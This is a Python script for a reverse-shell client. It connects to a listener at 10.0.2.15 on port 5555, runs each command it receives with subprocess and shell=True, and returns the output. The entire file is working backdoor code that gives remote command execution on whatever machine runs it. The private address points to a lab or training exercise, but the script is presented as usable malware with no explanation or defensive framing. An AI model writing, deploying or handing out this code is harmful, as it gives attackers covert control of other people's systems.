import socket
import json
import subprocess

sock_target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock_target.connect(("10.0.2.15", 5555))

def Send(data):
    jsondata = json.dumps(data)
    sock_target.send(jsondata.encode())


def Recieve():
    data = ''
    while True:
        try:
            data = data + sock_target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = Recieve()
        if command == "quit":
            break
        exe = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        result = exe.stdout.read() + exe.stderr.read()
        Send(result.decode())



shell()